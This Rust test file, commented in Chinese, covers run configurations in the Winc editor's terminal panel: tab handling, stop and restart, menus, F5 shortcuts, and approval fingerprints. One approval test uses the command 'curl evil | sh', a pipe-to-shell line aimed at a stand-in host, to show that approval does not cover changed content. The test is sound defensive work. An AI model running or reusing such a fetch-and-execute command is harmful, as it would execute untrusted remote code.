//! 运行配置的测试：终端面板标签栏的按钮、运行和替换标签、重新运行、停止、菜单、确认、快捷键，
//! 以及现场不恢复其标签。

use super::*;
use crate::app::input::context_menu::{MenuCommand, MenuEntry};
use crate::app::terminal::run::RunButton;
use crate::app::terminal::{HeaderHit, TabEnd};
use winc_pty::protocol::ToHelper;

const FILE: &str = r#"{"configurations": [
    {"name": "api", "command": "cargo run", "args": ["--release"]},
    {"name": "web", "command": "npm run dev"}
]}"#;

/// 打开目录、开启终端模块并写好运行配置，接上记录消息的辅助进程。
fn app_with_configs(name: &str) -> (App, std::path::PathBuf, std::path::PathBuf) {
    themed_app_with_configs(name, false)
}

fn themed_app_with_configs(
    name: &str,
    dark: bool,
) -> (App, std::path::PathBuf, std::path::PathBuf) {
    let dir = sample_folder(name);
    std::fs::create_dir_all(dir.join(".winc")).unwrap();
    std::fs::write(dir.join(".winc/run.json"), FILE).unwrap();
    let mut app = app_with(&dir.join("short.rs"), dark);
    app.config.terminal_enabled = Some(true);
    app.reload_run_configs();
    app.relayout();
    let log = app.attach_recording_helper(&dir);
    (app, dir, log)
}

/// 删掉测试目录。记录消息的脚本可能正要在其中建日志文件，删除失败不算测试失败。
fn clean(dir: &std::path::Path) {
    let _ = std::fs::remove_dir_all(dir);
}

/// 运行当前配置并建好标签。
fn run_current(app: &mut App) {
    app.run_current_config();
    app.relayout();
}

fn spawned(sent: &[ToHelper]) -> usize {
    let spawns = sent.iter().filter(|m| matches!(m, ToHelper::Spawn { .. }));
    spawns.count()
}

/// 绘制一帧后返回运行配置的按钮在标签栏上的位置；没有该按钮时返回 `None`。
fn run_button(app: &mut App, button: RunButton) -> Option<(f32, f32)> {
    paint(app);
    let hit = HeaderHit::Run(button);
    let rect = app.hits.terminal.iter().find(|(_, h)| *h == hit)?.0;
    Some((rect.x + rect.w / 2.0, rect.y + rect.h / 2.0))
}

/// 按钮在面板的标签栏上，编辑区标签栏不让出位置；模块关着时不读文件。
#[test]
fn the_buttons_show_in_the_panel_only_with_configurations() {
    let (mut app, dir, _log) = app_with_configs("run-buttons");
    let tabs = app.layout.tabs.w;
    app.new_terminal_tab_in(Vec::new());
    app.relayout();
    assert!(run_button(&mut app, RunButton::Menu).is_some());
    assert!(run_button(&mut app, RunButton::Start).is_some());
    assert_eq!(app.layout.tabs.w, tabs);

    // 没有配置时只有运行按钮，点击后打开配置文件，不运行任何命令。
    std::fs::write(dir.join(".winc/run.json"), "{}").unwrap();
    app.reload_run_configs();
    assert!(run_button(&mut app, RunButton::Menu).is_none());
    assert!(run_button(&mut app, RunButton::Stop).is_none());
    let start = run_button(&mut app, RunButton::Start).unwrap();
    click(&mut app, start);
    assert_eq!(app.terminal.tabs.len(), 1);
    assert!(app.editor.active().unwrap().name().ends_with("run.json"));

    std::fs::write(dir.join(".winc/run.json"), FILE).unwrap();
    app.reload_run_configs();
    assert!(run_button(&mut app, RunButton::Start).is_some());
    app.config.terminal_enabled = Some(false);
    app.reload_run_configs();
    assert!(app.run.list.is_empty());
    clean(&dir);
}

/// 点运行不移动焦点；不在运行时点不到停止，运行中才可以点。
#[test]
fn the_panel_buttons_run_and_stop_without_moving_the_focus() {
    let (mut app, dir, log) = app_with_configs("run-click");
    app.new_terminal_tab_in(Vec::new());
    app.relayout();
    app.focus = Focus::Editor;
    assert!(run_button(&mut app, RunButton::Stop).is_none());
    let start = run_button(&mut app, RunButton::Start).unwrap();
    click(&mut app, start);
    app.relayout();
    assert_eq!(app.focus, Focus::Editor);
    assert_eq!(app.terminal.tabs.len(), 2);
    assert!(app.run_config_running());
    let stop = run_button(&mut app, RunButton::Stop).unwrap();
    click(&mut app, stop);
    assert_eq!(app.focus, Focus::Editor);
    let id = app.terminal.tabs[1].id;
    assert!(
        app.sent_to_helper(&log)
            .iter()
            .any(|m| matches!(m, ToHelper::Stop { tab } if *tab == id))
    );
    clean(&dir);
}

/// 运行：焦点留在编辑区，命令由 shell 执行，标签以配置命名；退出后标签保留，可用「运行」替换。
#[test]
fn running_opens_a_tab_and_replaces_it_after_exit() {
    let (mut app, dir, log) = app_with_configs("run-start");
    app.focus = Focus::Editor;
    run_current(&mut app);
    assert_eq!(app.focus, Focus::Editor);
    assert!(app.terminal.open);
    assert_eq!(app.terminal.tabs.len(), 1, "不多开默认的 shell 标签");
    let id = app.terminal.tabs[0].id;
    assert_eq!(app.terminal.tabs[0].label(), "api");
    assert!(app.run_config_running());
    paint(&mut app);

    let sent = app.sent_to_helper(&log);
    let Some(ToHelper::Spawn {
        args,
        integration,
        cwd,
        ..
    }) = sent.iter().find(|m| matches!(m, ToHelper::Spawn { .. }))
    else {
        panic!("应该发了 Spawn：{sent:?}");
    };
    assert_eq!(args.last().unwrap(), b"cargo run --release");
    assert_eq!(integration, &None);
    let root = app.editor.root().unwrap();
    assert_eq!(cwd, root.to_str().unwrap().as_bytes());

    app.terminal_message(FromHelper::Exited { tab: id, code: 3 });
    assert!(!app.run_config_running());
    assert_eq!(app.terminal.tabs[0].ended, Some(TabEnd::Exited(3)));

    run_current(&mut app);
    assert_eq!(app.terminal.tabs.len(), 1);
    assert_ne!(app.terminal.tabs[0].id, id);
    assert!(app.run_config_running());
    let sent = app.sent_to_helper(&log);
    assert_eq!(spawned(&sent), 2);
    assert!(
        sent.iter()
            .any(|m| matches!(m, ToHelper::Close { tab } if *tab == id))
    );
    // 还连着辅助进程：只替换了标签，没有因为关掉最后一个标签而断开。
    assert!(app.terminal_connected());
    clean(&dir);
}

/// 运行中再次运行：先停止，退出后在原位置启动新的，其他标签不变。
#[test]
fn running_again_stops_first_and_keeps_the_position() {
    let (mut app, dir, log) = app_with_configs("run-again");
    app.new_terminal_tab_in(Vec::new());
    app.relayout();
    run_current(&mut app);
    app.new_terminal_tab_in(Vec::new());
    app.relayout();
    assert_eq!(app.terminal.tabs.len(), 3);
    let id = app.terminal.tabs[1].id;

    run_current(&mut app);
    assert_eq!(app.terminal.active, 1);
    assert_eq!(app.terminal.tabs[1].id, id, "退出之前不替换");
    let sent = app.sent_to_helper(&log);
    assert!(
        sent.iter()
            .any(|m| matches!(m, ToHelper::Stop { tab } if *tab == id))
    );

    app.terminal_message(FromHelper::Exited { tab: id, code: 129 });
    app.relayout();
    assert_eq!(app.terminal.tabs.len(), 3);
    assert_ne!(app.terminal.tabs[1].id, id);
    assert_eq!(app.terminal.tabs[1].label(), "api");
    assert!(app.run_config_running());
    assert_eq!(app.terminal.active, 1);
    clean(&dir);
}

/// 停止：只发停止消息，标签保留，退出后不重新运行；不在运行时没有停止按钮。
#[test]
fn stopping_keeps_the_tab_and_does_not_run_again() {
    let (mut app, dir, log) = app_with_configs("run-stop");
    run_current(&mut app);
    let id = app.terminal.tabs[0].id;
    let stop = run_button(&mut app, RunButton::Stop).unwrap();
    click(&mut app, stop);
    let sent = app.sent_to_helper(&log);
    assert!(
        sent.iter()
            .any(|m| matches!(m, ToHelper::Stop { tab } if *tab == id))
    );

    app.terminal_message(FromHelper::Exited { tab: id, code: 129 });
    app.relayout();
    assert_eq!(app.terminal.tabs.len(), 1);
    assert_eq!(app.terminal.tabs[0].id, id);
    assert_eq!(spawned(&app.sent_to_helper(&log)), 1);
    clean(&dir);
}

/// 「重新启动」重新运行配置，不是打开 shell。
#[test]
fn restarting_runs_the_configuration_again() {
    let (mut app, dir, log) = app_with_configs("run-restart");
    run_current(&mut app);
    let id = app.terminal.tabs[0].id;
    app.terminal_message(FromHelper::Exited { tab: id, code: 1 });
    app.restart_terminal_tab();
    app.relayout();
    assert!(app.terminal.want.is_empty());
    assert_eq!(app.terminal.tabs[0].label(), "api");
    assert_eq!(spawned(&app.sent_to_helper(&log)), 2);
    clean(&dir);
}

/// 现场不记录运行配置的标签，正在看的标签下标跳过它们；辅助进程退出后也不重开它们。
#[test]
fn run_tabs_are_not_restored() {
    let (mut app, dir, _log) = app_with_configs("run-session");
    run_current(&mut app);
    assert!(app.terminal_session().is_none());

    app.new_terminal_tab_in(b"/tmp".to_vec());
    app.relayout();
    let session = app.terminal_session().unwrap();
    assert_eq!(session.tabs.len(), 1);
    assert_eq!(session.active, 0);

    app.terminal_helper_gone();
    app.restart_terminal_tab();
    assert_eq!(app.terminal.want.len(), 1);
    assert!(app.terminal.tabs.is_empty());
    clean(&dir);
}

/// 菜单列出各配置和编辑入口，选中后运行的是选中的配置；文件变化后重新读取。
#[test]
fn the_menu_selects_and_the_file_is_watched() {
    let (mut app, dir, log) = app_with_configs("run-menu");
    app.new_terminal_tab_in(Vec::new());
    app.relayout();
    let menu = run_button(&mut app, RunButton::Menu).unwrap();
    click(&mut app, menu);
    assert_eq!(app.menu_button, Some(crate::app::MenuButton::RunConfigs));
    assert_eq!(
        app.context_menu.as_ref().expect("弹出了菜单").entries,
        [
            MenuEntry::Item(MenuCommand::RunSelect(0), true),
            MenuEntry::Item(MenuCommand::RunSelect(1), true),
            MenuEntry::Separator,
            MenuEntry::Item(MenuCommand::RunEdit, true),
        ]
    );
    assert!(app.menu_checked(MenuCommand::RunSelect(0)));
    assert_eq!(app.menu_label(MenuCommand::RunSelect(1)).title, "web");
    app.select_run_config(1);
    assert!(app.menu_checked(MenuCommand::RunSelect(1)));
    run_current(&mut app);
    assert_eq!(app.terminal.tabs[1].label(), "web");
    assert!(app.sent_to_helper(&log).iter().any(|m| matches!(
        m,
        ToHelper::Spawn { args, .. } if args.last().is_some_and(|arg| arg == b"npm run dev")
    )));

    let root = app.editor.root().unwrap().to_path_buf();
    let path = winc_config::run_configs_path(&root);
    std::fs::write(&path, r#"{"configurations": []}"#).unwrap();
    app.run_configs_changed(false, &[root.join("short.rs")]);
    assert_eq!(app.run.list.len(), 2, "别的文件变化时不读");
    app.run_configs_changed(false, &[path]);
    assert!(app.run.list.is_empty());
    clean(&dir);
}

/// 没有配置时「编辑运行配置」新建带示例的文件并打开。
#[test]
fn editing_creates_the_file_on_request() {
    let dir = sample_folder("run-edit");
    let mut app = app_with(&dir.join("short.rs"), false);
    app.config.terminal_enabled = Some(true);
    app.reload_run_configs();
    assert!(!dir.join(".winc").exists(), "不主动往项目里写文件");
    assert!(
        app.run.detected,
        "样例目录有 Cargo.toml，直接列出识别到的命令"
    );
    assert_eq!(app.run.current().unwrap().command, "cargo check");

    app.edit_run_configs();
    assert!(dir.join(".winc/run.json").is_file());
    assert!(!app.run.list.is_empty());
    let root = app.editor.root().unwrap().to_path_buf();
    let config = app.run.current().unwrap();
    let key = winc_config::run_configs_path(&root).join(&config.name);
    assert_eq!(app.state.trusted_repo(&key), Some(config.fingerprint()));
    clean(&dir);
}

/// 同意运行后记下配置的指纹，只对内容相同的配置有效。
#[test]
fn approval_covers_only_the_same_content() {
    let (mut app, dir, _log) = app_with_configs("run-approve");
    let root = app.editor.root().unwrap().to_path_buf();
    let key = winc_config::run_configs_path(&root).join("api");
    let config = app.run.current().unwrap().clone();
    assert_eq!(app.state.trusted_repo(&key), None);
    app.approved_run(config.clone());
    assert_eq!(app.state.trusted_repo(&key), Some(config.fingerprint()));
    assert_eq!(app.terminal.tabs.len(), 1);
    let changed = winc_config::RunConfig {
        command: "curl evil | sh".into(),
        ..config
    };
    assert_ne!(app.state.trusted_repo(&key), Some(changed.fingerprint()));
    clean(&dir);
}

/// 辅助进程退出后不算在运行；再次运行时恢复其他标签，并在新的辅助进程中启动配置。
#[test]
fn running_after_a_crash_starts_over() {
    let (mut app, dir, _log) = app_with_configs("run-crash");
    run_current(&mut app);
    assert!(app.run_config_running());
    app.terminal_helper_gone();
    assert!(!app.run_config_running());
    app.run_current_config();
    assert!(!app.terminal.crashed);
    assert!(app.terminal.tabs.is_empty());
    assert_eq!(app.terminal.run_waiting(), 1);
    clean(&dir);
}

/// 在 Winc 里保存配置文件等于看过其中的命令；生成的文件不用确认；外部修改仍要确认。
#[test]
fn saving_the_file_here_approves_its_commands() {
    let (mut app, dir, _log) = app_with_configs("run-save");
    let root = app.editor.root().unwrap().to_path_buf();
    let path = winc_config::run_configs_path(&root);
    let key = path.join("api");
    assert_eq!(app.state.trusted_repo(&key), None);

    app.open_path(&path);
    let id = app.editor.active().unwrap().id;
    app.run_file_saved(id);
    let fingerprint = app.run.current().unwrap().fingerprint();
    assert_eq!(app.state.trusted_repo(&key), Some(fingerprint));

    // 外部改动：指纹不同，下次运行仍要确认。
    std::fs::write(
        &path,
        r#"{"configurations": [{"name": "api", "command": "other"}]}"#,
    )
    .unwrap();
    app.reload_run_configs();
    assert_ne!(
        app.state.trusted_repo(&key),
        Some(app.run.current().unwrap().fingerprint())
    );

    // 别的文件保存时不算。
    app.open_path(&root.join("short.rs"));
    let id = app.editor.active().unwrap().id;
    app.run_file_saved(id);
    assert_ne!(
        app.state.trusted_repo(&key),
        Some(app.run.current().unwrap().fingerprint())
    );
    clean(&dir);
}

/// 用户停止的不提醒、不算失败；不在眼前失败时提醒并留红点，在眼前时不打扰。
#[test]
fn exits_are_reported_only_when_unseen() {
    let (mut app, dir, _log) = app_with_configs("run-exit");
    run_current(&mut app);
    let id = app.terminal.tabs[0].id;

    app.terminal_message(FromHelper::Exited { tab: id, code: 1 });
    assert_eq!(app.terminal.tabs[0].unseen, None);
    assert!(app.notice.text.is_none());

    run_current(&mut app);
    app.terminal.open = false;
    let id = app.terminal.tabs[0].id;
    app.terminal_message(FromHelper::Exited { tab: id, code: 2 });
    assert_eq!(app.terminal.tabs[0].unseen, Some(true));
    assert!(app.notice.text.as_deref().unwrap().contains("api"));

    app.notice.text = None;
    app.terminal.open = true;
    app.terminal.tabs[0].unseen = None;
    run_current(&mut app);
    app.terminal.open = false;
    let id = app.terminal.tabs[0].id;
    app.stop_current_config();
    app.terminal_message(FromHelper::Exited { tab: id, code: 137 });
    assert_eq!(app.terminal.tabs[0].unseen, None);
    assert!(app.notice.text.is_none());
    clean(&dir);
}

/// 没有运行时没有停止按钮，运行按钮紧贴位置按钮；运行时多一个停止按钮。
#[test]
fn the_stop_button_appears_only_while_running() {
    let (mut app, dir, _log) = app_with_configs("run-stop-button");
    let hit = |app: &App, want: HeaderHit| {
        let hits = &app.hits.terminal;
        hits.iter().find(|(_, h)| *h == want).map(|(rect, _)| *rect)
    };
    let start = HeaderHit::Run(RunButton::Start);
    let stop = HeaderHit::Run(RunButton::Stop);
    app.new_terminal_tab_in(Vec::new());
    paint(&mut app);
    assert!(hit(&app, stop).is_none());
    let position = hit(&app, HeaderHit::Position).unwrap();
    let idle = hit(&app, start).unwrap();
    assert_eq!(position.x - idle.right(), crate::theme::TAB_GAP);

    run_current(&mut app);
    paint(&mut app);
    let running = hit(&app, stop).unwrap();
    assert_eq!(position.x - running.right(), crate::theme::TAB_GAP);
    let moved = hit(&app, start).unwrap();
    assert_eq!(running.x - moved.right(), crate::theme::TAB_GAP);
    clean(&dir);
}

/// 停止按钮淡入、淡出，运行按钮跟着滑动；消失的过程中已经点不了。
#[test]
fn the_stop_button_fades_and_the_run_button_slides() {
    use std::time::Duration;
    let (mut app, dir, _log) = app_with_configs("run-stop-motion");
    let hit = |app: &App, want: HeaderHit| {
        let hits = &app.hits.terminal;
        hits.iter().find(|(_, h)| *h == want).map(|(rect, _)| *rect)
    };
    let start = HeaderHit::Run(RunButton::Start);
    let stop = HeaderHit::Run(RunButton::Stop);
    app.new_terminal_tab_in(Vec::new());
    paint(&mut app);
    let idle = hit(&app, start).unwrap().x;
    let moved = idle - crate::theme::BUTTON - crate::theme::TAB_GAP;

    // 开始运行，动画走到一半：运行按钮在两个位置之间，停止按钮已经能点。
    app.terminal.strip.frozen = Some(Duration::from_millis(60));
    run_current(&mut app);
    paint(&mut app);
    let x = hit(&app, start).unwrap().x;
    assert!(moved < x && x < idle, "{moved} < {x} < {idle}");
    assert!(hit(&app, stop).is_some());
    assert!(app.terminal.strip.animating());

    clean(&dir);

    // 没有动画时直接到位。
    let (mut app, dir, _log) = app_with_configs("run-stop-motion-end");
    app.new_terminal_tab_in(Vec::new());
    paint(&mut app);
    run_current(&mut app);
    paint(&mut app);
    assert_eq!(hit(&app, start).unwrap().x, moved);
    let id = app.terminal.tab().unwrap().id;

    // 运行结束，动画走到一半：运行按钮往回滑，停止按钮已经点不了。
    app.terminal.strip.frozen = Some(Duration::from_millis(60));
    app.terminal_message(FromHelper::Exited { tab: id, code: 0 });
    paint(&mut app);
    let x = hit(&app, start).unwrap().x;
    assert!(moved < x && x < idle, "{moved} < {x} < {idle}");
    assert!(hit(&app, stop).is_none());
    clean(&dir);
}

/// 菜单显示每个配置的命令，正在运行的有标记。
#[test]
fn the_menu_shows_commands_and_what_is_running() {
    let (mut app, dir, _log) = app_with_configs("run-menu-label");
    let subtitle = |app: &App, i| app.menu_label(MenuCommand::RunSelect(i)).subtitle;
    assert_eq!(subtitle(&app, 0).as_deref(), Some("cargo run"));
    run_current(&mut app);
    assert!(subtitle(&app, 0).unwrap().contains("cargo run"));
    assert_ne!(subtitle(&app, 0).as_deref(), Some("cargo run"));
    assert_eq!(subtitle(&app, 1).as_deref(), Some("npm run dev"));
    clean(&dir);
}

/// F5 在编辑区运行，⇧F5 停止；焦点在终端时按键交给其中的程序。
#[test]
fn f5_runs_except_inside_the_terminal() {
    use crate::keymap::KeyCode::F;
    let (mut app, dir, _log) = app_with_configs("run-keys");
    app.focus = Focus::Editor;
    assert!(press(&mut app, &[], F(5)));
    app.relayout();
    assert!(app.run_config_running());
    let id = app.terminal.tabs[0].id;
    assert!(press(&mut app, &["shift"], F(5)));
    assert!(app.terminal.tabs[0].stopped);

    app.terminal_message(FromHelper::Exited { tab: id, code: 129 });
    app.focus = Focus::Terminal;
    assert!(!press(&mut app, &[], F(5)), "终端里的程序收到这个键");
    app.relayout();
    assert_eq!(app.terminal.tabs[0].id, id);
    clean(&dir);
}

/// 启动时恢复的目录不经过打开目录的流程：窗口建好时读取配置，并恢复上次选中的配置。
#[test]
fn configurations_load_when_the_first_window_opens() {
    let (mut app, dir, _log) = app_with_configs("run-launch");
    let folder = app.editor.root().unwrap().to_path_buf();
    app.update_state(|state| {
        state.set_session(winc_config::Session {
            folder,
            run: Some("web".into()),
            ..winc_config::Session::default()
        });
    });
    app.run = Default::default();
    assert!(app.run.current().is_none());

    app.load_run_configs_for_window();
    assert_eq!(app.run.list.len(), 2);
    assert_eq!(app.run.current().unwrap().name, "web");
    clean(&dir);
}

/// 没有配置文件时可以直接运行识别到的命令；有文件后以文件为准，文件为空时不再列出。
#[test]
fn detected_commands_run_without_a_file() {
    let dir = sample_folder("run-detected");
    let mut app = app_with(&dir.join("short.rs"), false);
    app.config.terminal_enabled = Some(true);
    app.reload_run_configs();
    app.relayout();
    let log = app.attach_recording_helper(&dir);
    assert!(app.run.detected);
    let name = app.run.current().unwrap().name.clone();
    run_current(&mut app);
    assert_eq!(app.terminal.tabs[0].label(), name);
    assert!(!dir.join(".winc").exists());
    assert!(app.sent_to_helper(&log).iter().any(|m| matches!(
        m,
        ToHelper::Spawn { banner, .. } if String::from_utf8_lossy(banner).contains("cargo check")
    )));

    std::fs::create_dir_all(dir.join(".winc")).unwrap();
    std::fs::write(dir.join(".winc/run.json"), FILE).unwrap();
    app.reload_run_configs();
    assert!(!app.run.detected);
    assert_eq!(app.run.list.len(), 2);
    std::fs::write(dir.join(".winc/run.json"), "{}").unwrap();
    app.reload_run_configs();
    assert!(app.run.list.is_empty());
    clean(&dir);
}

/// 连上真实的辅助进程运行配置，需要先构建 `winc-pty` 并用 `WINC_PTY` 指向它。
#[test]
#[ignore = "需要真实的辅助进程，手动运行"]
fn a_configuration_runs_in_a_real_terminal() {
    let dir = sample_folder("run-real");
    std::fs::create_dir_all(dir.join(".winc")).unwrap();
    std::fs::create_dir_all(dir.join("sub")).unwrap();
    let file = r#"{"configurations": [{
        "name": "real",
        "command": "echo \"$RUN_TEST_VALUE $(basename $PWD)\"; printf '<%s>' \"$0\"; exit 3",
        "args": [],
        "cwd": "sub",
        "env": {"RUN_TEST_VALUE": "from-config"}
    }]}"#;
    std::fs::write(dir.join(".winc/run.json"), file).unwrap();
    let mut app = app_with(&dir.join("short.rs"), false);
    app.config.terminal_enabled = Some(true);
    app.reload_run_configs();
    app.relayout();
    run_current(&mut app);
    assert!(app.terminal.error.is_none(), "{:?}", app.terminal.error);
    let screen = |app: &App| {
        app.terminal.tab().map_or_else(String::new, |tab| {
            let lines: Vec<&str> = tab.rows.iter().map(winc_pty::Line::trimmed).collect();
            lines.join("\n")
        })
    };
    let wait = |app: &mut App, done: &dyn Fn(&App) -> bool| {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
        while !done(app) {
            assert!(
                std::time::Instant::now() < deadline,
                "等太久了，屏幕上是：\n{}",
                screen(app)
            );
            std::thread::sleep(std::time::Duration::from_millis(20));
            app.poll_terminal();
            paint(app);
            app.after_terminal_frame();
        }
    };
    let exited = |code| {
        move |app: &App| {
            app.terminal
                .tab()
                .is_some_and(|t| t.ended == Some(TabEnd::Exited(code)))
        }
    };
    wait(&mut app, &exited(3));
    wait(&mut app, &|app| screen(app).contains("from-config sub"));
    assert!(screen(&app).starts_with("▶ echo"), "{}", screen(&app));
    // 命令行那一行开始一个命令块，程序退出后带退出码结束。
    let ended = |app: &App| {
        app.terminal.tab().is_some_and(|t| {
            let ends: Vec<_> = t.blocks.iter().map(|b| (b.command, b.exit)).collect();
            ends == [(0, Some(3))]
        })
    };
    wait(&mut app, &ended);
    assert_eq!(app.terminal.tabs.len(), 1);

    // 长时间运行的配置：重新运行时先结束旧的，停止后标签保留。
    let long = r#"{"configurations": [{"name": "real", "command": "echo up; sleep 100"}]}"#;
    std::fs::write(
        winc_config::run_configs_path(app.editor.root().unwrap()),
        long,
    )
    .unwrap();
    run_current(&mut app);
    wait(&mut app, &|app| screen(app).contains("up"));
    let first = app.terminal.tabs[0].id;
    run_current(&mut app);
    wait(&mut app, &|app| {
        app.terminal.tabs[0].id != first && screen(app).contains("up")
    });
    assert_eq!(app.terminal.tabs.len(), 1);
    app.stop_current_config();
    wait(&mut app, &|app| !app.run_config_running());
    assert!(screen(&app).contains("up"));

    // 输出超过一屏：命令行那一行滚出视口后吸顶。
    let many = r#"{"configurations": [{"name": "real", "command": "seq 1 300"}]}"#;
    std::fs::write(
        winc_config::run_configs_path(app.editor.root().unwrap()),
        many,
    )
    .unwrap();
    run_current(&mut app);
    wait(&mut app, &|app| screen(app).contains("300"));
    wait(&mut app, &|app| {
        app.terminal.tab().is_some_and(|t| t.sticky() == Some(0))
    });
    clean(&dir);
}

/// 截图：面板标签栏上的按钮，分别是未运行和运行中。
#[test]
#[ignore = "截图，手动运行"]
fn snapshot_run_buttons() {
    for dark in [false, true] {
        let (mut app, dir, _log) = themed_app_with_configs("run-shot", dark);
        let theme = if dark { "dark" } else { "light" };
        app.new_terminal_tab_in(Vec::new());
        app.relayout();
        shoot(&mut app, &format!("run-idle-{theme}"));
        run_current(&mut app);
        shoot(&mut app, &format!("run-running-{theme}"));
        clean(&dir);
    }
}
